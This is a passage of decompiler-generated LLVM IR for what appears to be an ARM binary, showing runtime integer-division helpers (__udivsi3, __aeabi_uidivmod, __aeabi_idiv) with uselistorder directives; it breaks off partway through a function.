  %v3_12ab0 = inttoptr i32 %v2_12ab0 to i8*
  store i8 %v2_12aa8, i8* %v3_12ab0, align 1
  %v4_12ab0 = load i32, i32* %r0.global-to-local, align 4
  %v5_12ab0 = add i32 %v4_12ab0, 1
  store i32 %v5_12ab0, i32* %r0.global-to-local, align 4
  br i1 %v3_12aac, label %dec_label_pc_12ab8, label %dec_label_pc_12aa4.dec_label_pc_12aa4_crit_edge

dec_label_pc_12aa4.dec_label_pc_12aa4_crit_edge:  ; preds = %dec_label_pc_12aa4
  %v0_12aa4.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_12aa8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12aa4

dec_label_pc_12ab8:                               ; preds = %dec_label_pc_12aa4, %.thread1, %entry
  %v0_12ab8 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_12ab8, i32* %r0.global-to-local, align 4
  ret i32 %v0_12ab8

dec_label_pc_12ac8:                               ; preds = %.thread11._crit_edge
  store i32 %v6_12a7c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12aa0

; uselistorder directives
  uselistorder i32 %v5_12ab0, { 1, 0 }
  uselistorder i1 %v3_12aac, { 1, 0 }
  uselistorder i32 %v0_12aa8, { 1, 0 }
  uselistorder i32 %v1_12a90, { 0, 1, 3, 2 }
  uselistorder i32 %v6_12a7c, { 1, 0 }
  uselistorder i32 %v2_12a7c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_12a78.pre, { 1, 0 }
  uselistorder i32 %v1_12a5c, { 1, 0, 3, 2 }
  uselistorder i32 %v2_12a54, { 1, 0 }
  uselistorder i32 %v3_12a38, { 0, 2, 1, 3, 4 }
  uselistorder i1 %phitmp, { 2, 1, 0 }
  uselistorder i32 %v0_129d8, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 11, 10, 12, 13 }
  uselistorder i8 45, { 1, 0 }
  uselistorder i32 55, { 9, 0, 8, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder label %dec_label_pc_12aa0, { 1, 0 }
  uselistorder label %dec_label_pc_12a90, { 1, 0 }
  uselistorder label %.thread11._crit_edge, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_129fc, { 2, 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_12ad0 = load i32, i32* @r1, align 4
  %v1_12ad0 = add i32 %v0_12ad0, -1
  store i32 %v1_12ad0, i32* %r2.global-to-local, align 4
  %v2_12ad0 = icmp eq i32 %v0_12ad0, 0
  %v7_12ad0 = icmp eq i32 %v0_12ad0, 1
  %v0_12ad4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_12ad0, i32 %v0_12ad4)
  br i1 %v2_12ad0, label %dec_label_pc_12bb8, label %dec_label_pc_12adc

dec_label_pc_12adc:                               ; preds = %entry
  %v0_12adc = load i32, i32* %r0.global-to-local, align 4
  %v1_12adc = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_12adc, %v1_12adc
  br i1 %tmp, label %dec_label_pc_12ae4, label %dec_label_pc_12b70

dec_label_pc_12ae4:                               ; preds = %dec_label_pc_12adc
  %v1_12ae4 = load i32, i32* %r2.global-to-local, align 4
  %v2_12ae4 = and i32 %v1_12ae4, %v1_12adc
  %v4_12ae4 = icmp eq i32 %v2_12ae4, 0
  br i1 %v4_12ae4, label %dec_label_pc_12b7c, label %dec_label_pc_12aec

dec_label_pc_12aec:                               ; preds = %dec_label_pc_12ae4
  %v3_12aec = icmp ult i32 %v1_12adc, 536870912
  br i1 %v3_12aec, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_12aec
  %v4_12af0 = mul i32 %v1_12adc, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_12aec, %.thread
  %v0_12b10.pr36.ph = phi i32 [ %v4_12af0, %.thread ], [ %v1_12adc, %dec_label_pc_12aec ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_12aec ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_12b10.pr36 = phi i32 [ %v4_12b04, %bb81 ], [ %v0_12b10.pr36.ph, %.preheader.preheader ]
  %v1_12b08 = phi i32 [ %v4_12b08, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_12afc = icmp ugt i32 %v0_12b10.pr36, 268435455
  br i1 %v2_12afc, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_12b10thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_12b00 = icmp ult i32 %v0_12b10.pr36, %v0_12adc
  br i1 %v4_12b00, label %bb80, label %dec_label_pc_12b10thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_12b04 = and i32 %v0_12b10.pr36, 268435456
  %v3_12b04 = icmp eq i32 %v2_12b04, 0
  %v4_12b04 = mul i32 %v0_12b10.pr36, 16
  br i1 %v3_12b04, label %bb81, label %dec_label_pc_12b10.loopexit

bb81:                                             ; preds = %bb80
  %v2_12b08 = and i32 %v1_12b08, 268435456
  %v3_12b08 = icmp eq i32 %v2_12b08, 0
  %v4_12b08 = mul i32 %v1_12b08, 16
  br i1 %v3_12b08, label %.preheader, label %dec_label_pc_12b10thread-pre-split.loopexit.loopexit

dec_label_pc_12b10thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_12b1c48.ph = phi i32 [ %v1_12b08, %bb ], [ %v4_12b08, %bb81 ]
  %v0_12b10.pr38.ph = phi i32 [ %v0_12b10.pr36, %bb ], [ %v4_12b04, %bb81 ]
  br label %dec_label_pc_12b10thread-pre-split.loopexit

dec_label_pc_12b10thread-pre-split.loopexit:      ; preds = %dec_label_pc_12b10thread-pre-split.loopexit.loopexit, %.thread2
  %v1_12b1c48 = phi i32 [ %v1_12b08, %.thread2 ], [ %v1_12b1c48.ph, %dec_label_pc_12b10thread-pre-split.loopexit.loopexit ]
  %v0_12b10.pr38 = phi i32 [ %v0_12b10.pr36, %.thread2 ], [ %v0_12b10.pr38.ph, %dec_label_pc_12b10thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_12b10thread-pre-split

dec_label_pc_12b10thread-pre-split:               ; preds = %dec_label_pc_12b10thread-pre-split.loopexit, %bb83
  %v1_12b1c46 = phi i32 [ %v1_12b1c48, %dec_label_pc_12b10thread-pre-split.loopexit ], [ %v3_12b1c, %bb83 ]
  %v0_12b10.pr = phi i32 [ %v0_12b10.pr38, %dec_label_pc_12b10thread-pre-split.loopexit ], [ %v3_12b18, %bb83 ]
  br label %dec_label_pc_12b10

dec_label_pc_12b10.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_12b10

dec_label_pc_12b10:                               ; preds = %dec_label_pc_12b10.loopexit, %dec_label_pc_12b10thread-pre-split
  %v1_12b1c = phi i32 [ %v1_12b1c46, %dec_label_pc_12b10thread-pre-split ], [ %v1_12b08, %dec_label_pc_12b10.loopexit ]
  %v1_12b18 = phi i32 [ %v0_12b10.pr, %dec_label_pc_12b10thread-pre-split ], [ %v4_12b04, %dec_label_pc_12b10.loopexit ]
  %v2_12b10 = icmp slt i32 %v1_12b18, 0
  br i1 %v2_12b10, label %dec_label_pc_12b24, label %bb82

bb82:                                             ; preds = %dec_label_pc_12b10
  %v4_12b14 = icmp ult i32 %v1_12b18, %v0_12adc
  br i1 %v4_12b14, label %bb83, label %dec_label_pc_12b24

bb83:                                             ; preds = %bb82
  %v3_12b18 = mul i32 %v1_12b18, 2
  %v2_12b1c = icmp slt i32 %v1_12b1c, 0
  %v3_12b1c = mul i32 %v1_12b1c, 2
  br i1 %v2_12b1c, label %dec_label_pc_12b24, label %dec_label_pc_12b10thread-pre-split

dec_label_pc_12b24:                               ; preds = %bb82, %dec_label_pc_12b10, %bb83
  %v2_12b3059 = phi i32 [ %v3_12b1c, %bb83 ], [ %v1_12b1c, %bb82 ], [ %v1_12b1c, %dec_label_pc_12b10 ]
  %v1_12b2851 = phi i32 [ %v3_12b18, %bb83 ], [ %v1_12b18, %bb82 ], [ %v1_12b18, %dec_label_pc_12b10 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12b28

dec_label_pc_12b28:                               ; preds = %.thread11, %dec_label_pc_12b24
  %v1_12b5c = phi i32 [ %v4_12b5c, %.thread11 ], [ %v2_12b3059, %dec_label_pc_12b24 ]
  %v1_12b30 = phi i32 [ %v0_12b68, %.thread11 ], [ 0, %dec_label_pc_12b24 ]
  %v1_12b60 = phi i32 [ %v4_12b60, %.thread11 ], [ %v1_12b2851, %dec_label_pc_12b24 ]
  %v1_12b2c = phi i32 [ %v0_12b58, %.thread11 ], [ %v0_12adc, %dec_label_pc_12b24 ]
  %v3_12b28 = icmp ult i32 %v1_12b2c, %v1_12b60
  br i1 %v3_12b28, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_12b28
  %v3_12b2c = sub i32 %v1_12b2c, %v1_12b60
  store i32 %v3_12b2c, i32* %r0.global-to-local, align 4
  %v3_12b30 = or i32 %v1_12b30, %v1_12b5c
  store i32 %v3_12b30, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_12b28, %bb84
  %v1_12b38 = phi i32 [ %v1_12b2c, %dec_label_pc_12b28 ], [ %v3_12b2c, %bb84 ]
  %v1_12b3c = phi i32 [ %v1_12b30, %dec_label_pc_12b28 ], [ %v3_12b30, %bb84 ]
  %v4_12b34 = udiv i32 %v1_12b60, 2
  %v6_12b34 = icmp ult i32 %v1_12b38, %v4_12b34
  br i1 %v6_12b34, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_12b38 = urem i32 %v1_12b60, 2
  %v4_12b38 = icmp eq i32 %v3_12b38, 0
  %v6_12b38 = sub i32 %v1_12b38, %v4_12b34
  store i32 %v6_12b38, i32* %r0.global-to-local, align 4
  br i1 %v4_12b38, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_12b3c = udiv i32 %v1_12b5c, 2
  %v6_12b3c = or i32 %v1_12b3c, %v5_12b3c
  store i32 %v6_12b3c, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_12b44 = phi i32 [ %v6_12b38, %bb85 ], [ %v1_12b38, %.thread7 ], [ %v6_12b38, %bb86 ]
  %v1_12b48 = phi i32 [ %v1_12b3c, %bb85 ], [ %v1_12b3c, %.thread7 ], [ %v6_12b3c, %bb86 ]
  %v4_12b40 = udiv i32 %v1_12b60, 4
  %v6_12b40 = icmp ult i32 %v1_12b44, %v4_12b40
  br i1 %v6_12b40, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_12b44 = and i32 %v1_12b60, 2
  %v4_12b44 = icmp eq i32 %v3_12b44, 0
  %v6_12b44 = sub i32 %v1_12b44, %v4_12b40
  store i32 %v6_12b44, i32* %r0.global-to-local, align 4
  br i1 %v4_12b44, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_12b48 = udiv i32 %v1_12b5c, 4
  %v6_12b48 = or i32 %v1_12b48, %v5_12b48
  store i32 %v6_12b48, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_12b50 = phi i32 [ %v6_12b44, %bb87 ], [ %v1_12b44, %.thread8 ], [ %v6_12b44, %bb88 ]
  %v1_12b54 = phi i32 [ %v1_12b48, %bb87 ], [ %v1_12b48, %.thread8 ], [ %v6_12b48, %bb88 ]
  %v4_12b4c = udiv i32 %v1_12b60, 8
  %v6_12b4c = icmp ult i32 %v1_12b50, %v4_12b4c
  br i1 %v6_12b4c, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_12b50 = and i32 %v1_12b60, 4
  %v4_12b50 = icmp eq i32 %v3_12b50, 0
  %v6_12b50 = sub i32 %v1_12b50, %v4_12b4c
  store i32 %v6_12b50, i32* %r0.global-to-local, align 4
  br i1 %v4_12b50, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_12b54 = udiv i32 %v1_12b5c, 8
  %v6_12b54 = or i32 %v1_12b54, %v5_12b54
  store i32 %v6_12b54, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_12b68 = phi i32 [ %v1_12b54, %bb89 ], [ %v1_12b54, %.thread9 ], [ %v6_12b54, %bb90 ]
  %v0_12b58 = phi i32 [ %v6_12b50, %bb89 ], [ %v1_12b50, %.thread9 ], [ %v6_12b50, %bb90 ]
  %v2_12b58 = icmp eq i32 %v0_12b58, 0
  br i1 %v2_12b58, label %dec_label_pc_12b68, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_12b5c, 16
  br i1 %tmp138, label %dec_label_pc_12b68, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_12b5c = udiv i32 %v1_12b5c, 16
  %v4_12b60 = udiv i32 %v1_12b60, 16
  br label %dec_label_pc_12b28

dec_label_pc_12b68:                               ; preds = %thread-pre-split, %bb91
  store i32 %v0_12b68, i32* %r0.global-to-local, align 4
  ret i32 %v0_12b68

dec_label_pc_12b70:                               ; preds = %dec_label_pc_12adc
  %v9_12adc = icmp eq i32 %v0_12adc, %v1_12adc
  %. = zext i1 %v9_12adc to i32
  store i32 %., i32* %r0.global-to-local, align 4
  ret i32 %.

dec_label_pc_12b7c:                               ; preds = %dec_label_pc_12ae4
  %v2_12b7c = icmp ugt i32 %v1_12adc, 65535
  br i1 %v2_12b7c, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_12b7c
  %v2_12b80 = and i32 %v1_12adc, 32768
  %v3_12b80 = icmp eq i32 %v2_12b80, 0
  %v4_12b80 = udiv i32 %v1_12adc, 65536
  br i1 %v3_12b80, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_12b7c
  %v0_12b8c65 = phi i32 [ %v1_12adc, %dec_label_pc_12b7c ], [ %v4_12b80, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_12b90 = phi i32 [ %v0_12b8c65, %.thread16 ], [ %v4_12b80, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_12b8c = icmp ugt i32 %v1_12b90, 255
  br i1 %v2_12b8c, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_12b90 = and i32 %v1_12b90, 128
  %v3_12b90 = icmp eq i32 %v2_12b90, 0
  %v4_12b90 = udiv i32 %v1_12b90, 256
  br i1 %v3_12b90, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_12b94 = or i32 %storemerge, 8
  store i32 %v2_12b94, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_12ba0 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_12b94, %bb98 ]
  %v1_12b9c = phi i32 [ %v1_12b90, %bb96 ], [ %v4_12b90, %bb97 ], [ %v4_12b90, %bb98 ]
  %v2_12b98 = icmp ugt i32 %v1_12b9c, 15
  br i1 %v2_12b98, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_12b9c = and i32 %v1_12b9c, 8
  %v3_12b9c = icmp eq i32 %v2_12b9c, 0
  %v4_12b9c = udiv i32 %v1_12b9c, 16
  br i1 %v3_12b9c, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_12ba0 = add nsw i32 %v1_12ba0, 4
  store i32 %v2_12ba0, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_12ba8 = phi i32 [ %v1_12ba0, %.thread17 ], [ %v1_12ba0, %bb99 ], [ %v2_12ba0, %bb100 ]
  %v5_12bac = phi i32 [ %v1_12b9c, %.thread17 ], [ %v4_12b9c, %bb99 ], [ %v4_12b9c, %bb100 ]
  %v2_12ba4 = icmp ugt i32 %v5_12bac, 3
  %v7_12ba4 = icmp eq i32 %v5_12bac, 4
  %v2_12ba8 = xor i1 %v7_12ba4, true
  %v3_12ba8 = and i1 %v2_12ba4, %v2_12ba8
  br i1 %v3_12ba8, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_12ba8 = add nsw i32 %v4_12ba8, 3
  store i32 %v5_12ba8, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_12bac = phi i32 [ %v4_12ba8, %.thread18 ], [ %v5_12ba8, %bb101 ]
  %v2_12bac = xor i1 %v2_12ba4, true
  %v3_12bac = or i1 %v7_12ba4, %v2_12bac
  br i1 %v3_12bac, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_12bac = udiv i32 %v5_12bac, 2
  %v9_12bac = add i32 %v4_12bac, %v8_12bac
  store i32 %v9_12bac, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_12bb0 = phi i32 [ %v4_12bac, %bb102 ], [ %v9_12bac, %bb103 ]
  %v6_12bb0 = lshr i32 %v0_12adc, %v1_12bb0
  store i32 %v6_12bb0, i32* %r0.global-to-local, align 4
  ret i32 %v6_12bb0

dec_label_pc_12bb8:                               ; preds = %entry
  %v0_12bbc = call i32 @__div0()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_12bac, { 1, 0 }
  uselistorder i1 %v7_12ba4, { 1, 0 }
  uselistorder i32 %v4_12b9c, { 1, 0 }
  uselistorder i32 %v1_12b9c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_12b94, { 1, 0 }
  uselistorder i32 %v4_12b90, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_12b90, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12b80, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_12b58, { 1, 0 }
  uselistorder i32 %v0_12b68, { 1, 0, 2 }
  uselistorder i32 %v4_12b4c, { 1, 0 }
  uselistorder i32 %v1_12b54, { 1, 2, 0 }
  uselistorder i32 %v4_12b40, { 1, 0 }
  uselistorder i32 %v1_12b48, { 1, 2, 0 }
  uselistorder i32 %v4_12b34, { 1, 0 }
  uselistorder i32 %v1_12b3c, { 1, 2, 0 }
  uselistorder i32 %v1_12b60, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_12b30, { 1, 0 }
  uselistorder i32 %v1_12b5c, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_12b1c, { 1, 0 }
  uselistorder i32 %v3_12b18, { 1, 0 }
  uselistorder i32 %v1_12b18, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_12b1c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_12b08, { 1, 0 }
  uselistorder i32 %v4_12b04, { 2, 1, 0 }
  uselistorder i32 %v1_12b08, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_12b10.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_12adc, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_12adc, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_12ad0, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 0, 1 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_12b68, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_12b24, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12b10thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_12bd0 = udiv i32 %arg1, %arg2
  ret i32 %v2_12bd0
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  %v0_12be4 = load i32, i32* @r1, align 4
  %v1_12be4 = icmp slt i32 %v0_12be4, 0
  %v2_12be4 = icmp eq i32 %v0_12be4, 0
  %v2_12be8 = xor i32 %v0_12be4, %arg1
  br i1 %v2_12be4, label %dec_label_pc_12cfc, label %dec_label_pc_12bf0

dec_label_pc_12bf0:                               ; preds = %entry
  br i1 %v1_12be4, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_12bf0
  %v2_12bf0 = sub i32 0, %v0_12be4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_12bf0, %bb
  %v1_12cbc = phi i32 [ %v2_12bf0, %bb ], [ %v0_12be4, %dec_label_pc_12bf0 ]
  %v1_12bf4 = add i32 %v1_12cbc, -1
  %v7_12bf4 = icmp eq i32 %v1_12cbc, 1
  br i1 %v7_12bf4, label %dec_label_pc_12c9c, label %dec_label_pc_12bfc

dec_label_pc_12bfc:                               ; preds = %thread-pre-split
  %v1_12bfc = icmp slt i32 %arg1, 0
  br i1 %v1_12bfc, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_12bfc
  %v2_12c00 = sub i32 0, %arg1
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_12bfc, %bb85
  %v0_12cf0 = phi i32 [ %arg1, %dec_label_pc_12bfc ], [ %v2_12c00, %bb85 ]
  %v3_12c04 = icmp uge i32 %v0_12cf0, %v1_12cbc
  %v9_12c04 = icmp eq i32 %v0_12cf0, %v1_12cbc
  %v2_12c08 = xor i1 %v3_12c04, true
  %v3_12c08 = or i1 %v9_12c04, %v2_12c08
  br i1 %v3_12c08, label %dec_label_pc_12ca8, label %dec_label_pc_12c0c

dec_label_pc_12c0c:                               ; preds = %bb86
  %v2_12c0c = and i32 %v1_12bf4, %v1_12cbc
  %v4_12c0c = icmp eq i32 %v2_12c0c, 0
  br i1 %v4_12c0c, label %dec_label_pc_12cb8, label %dec_label_pc_12c14

dec_label_pc_12c14:                               ; preds = %dec_label_pc_12c0c
  %v3_12c14 = icmp ult i32 %v1_12cbc, 536870912
  br i1 %v3_12c14, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_12c14
  %v4_12c18 = mul i32 %v1_12cbc, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_12c14, %.thread
  %v0_12c38.pr40.ph = phi i32 [ %v4_12c18, %.thread ], [ %v1_12cbc, %dec_label_pc_12c14 ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_12c14 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_12c38.pr40 = phi i32 [ %v4_12c2c, %bb89 ], [ %v0_12c38.pr40.ph, %.preheader.preheader ]
  %v1_12c30 = phi i32 [ %v4_12c30, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_12c24 = icmp ugt i32 %v0_12c38.pr40, 268435455
  br i1 %v2_12c24, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_12c38thread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_12c28 = icmp ult i32 %v0_12c38.pr40, %v0_12cf0
  br i1 %v4_12c28, label %bb88, label %dec_label_pc_12c38thread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
  %v2_12c2c = and i32 %v0_12c38.pr40, 268435456
  %v3_12c2c = icmp eq i32 %v2_12c2c, 0
  %v4_12c2c = mul i32 %v0_12c38.pr40, 16
  br i1 %v3_12c2c, label %bb89, label %dec_label_pc_12c38.loopexit

bb89:                                             ; preds = %bb88
  %v2_12c30 = and i32 %v1_12c30, 268435456
  %v3_12c30 = icmp eq i32 %v2_12c30, 0
  %v4_12c30 = mul i32 %v1_12c30, 16
  br i1 %v3_12c30, label %.preheader, label %dec_label_pc_12c38thread-pre-split.loopexit.loopexit

dec_label_pc_12c38thread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_12c4452.ph = phi i32 [ %v1_12c30, %bb87 ], [ %v4_12c30, %bb89 ]
  %v0_12c38.pr42.ph = phi i32 [ %v0_12c38.pr40, %bb87 ], [ %v4_12c2c, %bb89 ]
  br label %dec_label_pc_12c38thread-pre-split.loopexit

dec_label_pc_12c38thread-pre-split.loopexit:      ; preds = %dec_label_pc_12c38thread-pre-split.loopexit.loopexit, %.thread3
  %v1_12c4452 = phi i32 [ %v1_12c30, %.thread3 ], [ %v1_12c4452.ph, %dec_label_pc_12c38thread-pre-split.loopexit.loopexit ]
  %v0_12c38.pr42 = phi i32 [ %v0_12c38.pr40, %.thread3 ], [ %v0_12c38.pr42.ph, %dec_label_pc_12c38thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_12c38thread-pre-split

dec_label_pc_12c38thread-pre-split:               ; preds = %dec_label_pc_12c38thread-pre-split.loopexit, %bb91
  %v1_12c4450 = phi i32 [ %v1_12c4452, %dec_label_pc_12c38thread-pre-split.loopexit ], [ %v3_12c44, %bb91 ]
  %v2_12c3c48 = phi i32 [ %v0_12cf0, %dec_label_pc_12c38thread-pre-split.loopexit ], [ %v2_12c3c, %bb91 ]
  %v0_12c38.pr = phi i32 [ %v0_12c38.pr42, %dec_label_pc_12c38thread-pre-split.loopexit ], [ %v3_12c40, %bb91 ]
  br label %dec_label_pc_12c38

dec_label_pc_12c38.loopexit:                      ; preds = %bb88
  br label %dec_label_pc_12c38

dec_label_pc_12c38:                               ; preds = %dec_label_pc_12c38.loopexit, %dec_label_pc_12c38thread-pre-split
  %v1_12c44 = phi i32 [ %v1_12c4450, %dec_label_pc_12c38thread-pre-split ], [ %v1_12c30, %dec_label_pc_12c38.loopexit ]
  %v2_12c3c = phi i32 [ %v2_12c3c48, %dec_label_pc_12c38thread-pre-split ], [ %v0_12cf0, %dec_label_pc_12c38.loopexit ]
  %v1_12c40 = phi i32 [ %v0_12c38.pr, %dec_label_pc_12c38thread-pre-split ], [ %v4_12c2c, %dec_label_pc_12c38.loopexit ]
  %v2_12c38 = icmp slt i32 %v1_12c40, 0
  br i1 %v2_12c38, label %dec_label_pc_12c4c, label %bb90

bb90:                                             ; preds = %dec_label_pc_12c38
  %v4_12c3c = icmp ult i32 %v1_12c40, %v2_12c3c
  br i1 %v4_12c3c, label %bb91, label %dec_label_pc_12c4c

bb91:                                             ; preds = %bb90
  %v3_12c40 = mul i32 %v1_12c40, 2
  %v2_12c44 = icmp slt i32 %v1_12c44, 0
  %v3_12c44 = mul i32 %v1_12c44, 2
  br i1 %v2_12c44, label %dec_label_pc_12c4c, label %dec_label_pc_12c38thread-pre-split

dec_label_pc_12c4c:                               ; preds = %bb90, %dec_label_pc_12c38, %bb91
  %v2_12c5863 = phi i32 [ %v3_12c44, %bb91 ], [ %v1_12c44, %bb90 ], [ %v1_12c44, %dec_label_pc_12c38 ]
  %v1_12c5055 = phi i32 [ %v3_12c40, %bb91 ], [ %v1_12c40, %bb90 ], [ %v1_12c40, %dec_label_pc_12c38 ]
  br label %dec_label_pc_12c50

dec_label_pc_12c50:                               ; preds = %.thread13, %dec_label_pc_12c4c
  %v1_12c84 = phi i32 [ %v4_12c84, %.thread13 ], [ %v2_12c5863, %dec_label_pc_12c4c ]
  %v1_12c58 = phi i32 [ %v1_12c94, %.thread13 ], [ 0, %dec_label_pc_12c4c ]
  %v1_12c88 = phi i32 [ %v4_12c88, %.thread13 ], [ %v1_12c5055, %dec_label_pc_12c4c ]
  %v1_12c54 = phi i32 [ %v0_12c80, %.thread13 ], [ %v0_12cf0, %dec_label_pc_12c4c ]
  %v3_12c50 = icmp ult i32 %v1_12c54, %v1_12c88
  br i1 %v3_12c50, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_12c50
  %v3_12c54 = sub i32 %v1_12c54, %v1_12c88
  %v3_12c58 = or i32 %v1_12c58, %v1_12c84
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_12c50, %bb92
  %v1_12c60 = phi i32 [ %v1_12c54, %dec_label_pc_12c50 ], [ %v3_12c54, %bb92 ]
  %v1_12c64 = phi i32 [ %v1_12c58, %dec_label_pc_12c50 ], [ %v3_12c58, %bb92 ]
  %v4_12c5c = udiv i32 %v1_12c88, 2
  %v6_12c5c = icmp ult i32 %v1_12c60, %v4_12c5c
